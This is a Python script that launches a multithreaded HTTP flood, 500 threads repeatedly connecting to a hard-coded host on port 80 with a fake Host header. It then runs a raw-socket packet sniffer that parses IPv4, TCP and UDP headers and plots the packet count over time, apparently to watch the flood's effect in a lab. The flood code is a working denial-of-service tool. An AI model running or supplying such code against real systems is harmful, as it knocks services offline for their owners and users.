import socket
import struct
import pandas as pd
import matplotlib.pyplot as plt
from matplotlib.animation import FuncAnimation
import time
import numpy as np 
import threading

target =  '192.168.0.235'
fake_ip = '182.21.20.32'
port = 80
running = True
def attack():
       global running
       while running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto("GET / HTTP/1.1\r\n".encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            s.close()
        except ConnectionAbortedError:
            pass
        except Exception as e:
            print(f"Unexpected error: {e}")
        
for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()


def ipv4_packet(data):
    version_header_length = data[0]
    version = version_header_length >> 4
    header_length = (version_header_length & 15) * 4
    ttl, proto, src, target = struct.unpack('! 8x B B 2x 4s 4s', data[:20])
    data = data[header_length:]
    return version, header_length, ttl, proto, ipv4(src), ipv4(target), data

def ipv4(addr):
    return '.'.join(map(str, addr))

def udp_datagram(data):
    src_port, dest_port, size = struct.unpack('! H H 2x H', data[:8])
    return src_port, dest_port

def tcp_segment(data):
    src_port, dest_port, sequence, acknowledgment, offset_reserved_flags = struct.unpack('! H H L L H', data[:14])
    return src_port, dest_port

fig, ax = plt.subplots()  # Create a figure and an axis
line, = ax.plot([], [], marker='o')  # This initializes the line object that we will use to update the plot

df = pd.DataFrame(columns=["Packet Count", "Time miliseconds"])
packet = 0
i = 0
timer_S = time.time()

HOST = socket.gethostbyname(socket.gethostname())  # gets IP
conn = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)  # establishes connection
conn.bind((HOST, 0))
conn.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
conn.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON) 

def init():
    ax.set_xlim(0, 105)
    ax.set_ylim(0, 500)
    return line,

def update(frame):
    global packet, i, df, timer_S
    packet += 1
    raw_data, addr = conn.recvfrom(65536)
    elapsed_time = time.time() - timer_S
    df.loc[len(df)] = [packet, elapsed_time]
    
    version, header_length, ttl, proto, src, dest, data = ipv4_packet(raw_data)
    print('\nIP Packet:')
    print(f'Version: {version}, Header Length: {header_length}, TTL: {ttl}')
    print(f'Protocol: {proto}, Source: {src}, Destination: {dest}')
    
    if proto == 17:
        src_port, dest_port = udp_datagram(data)
        print ("UDP")
        print(f"Source Port: {src_port}, Destination Port: {dest_port}")
        i += 1
    else:
        src_port, dest_port = tcp_segment(data)
        print("TCP")
        print(f"Source Port: {src_port}, Destination Port: {dest_port}")
        i += 1
    
    line.set_data(df["Packet Count"], df["Time miliseconds"])
    ax.relim()
    ax.autoscale_view()
    
    return line,

ani = FuncAnimation(fig, update, frames=range(0, 105), init_func=init, blit=True, repeat=False)
plt.xlabel('Packet Count')
plt.ylabel('Elapsed Time (s)')
plt.ion
plt.show(block = True)

    